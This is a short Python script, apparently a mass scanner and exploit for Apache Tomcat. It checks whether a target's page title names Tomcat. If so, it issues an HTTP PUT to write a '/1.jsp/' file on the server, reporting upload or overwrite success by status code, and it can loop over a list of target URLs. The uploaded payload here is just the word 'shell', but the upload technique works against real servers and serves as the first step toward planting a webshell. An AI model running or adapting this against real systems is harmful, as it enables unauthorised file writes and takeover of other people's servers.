import requests
import re
import sys
import argparse

headers={ "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
    }

def ccc(url):
    html = requests.get(url,headers=headers)
    title=(re.findall(r"<title.*?>(.+?)</title>", html.text))
    title2=title[0]
    if ("Apache Tomcat" in title2):
        aaa()
    else:
        print(url+"    未发现tomcat")

def aaa():
    url2=url+"/1.jsp/"
    payload="shell"
    html2 = requests.put(url2, data=payload,headers=headers)
    code=str(html2.status_code)

    if("201" in code):
        print(url2+"   上传成功",code)
    elif("204" in code):
        print(url2+"   覆盖成功",code)
    else:
        print(url+"   上传失败")


if __name__=="__main__":
    pas=argparse.ArgumentParser(description="ceshi")
    pas.add_argument("-u","--url",help="输入要传入的url")
    pas.add_argument("-t", "--text", help="输入要传入的文件")
    args=pas.parse_args()

    if args.url:
        url=args.url
        ccc(url)
    elif args.text:
        file=args.text
        file=open(args.text,"r")
        for url in file:
            url = url.strip("\n")
            ccc(url)
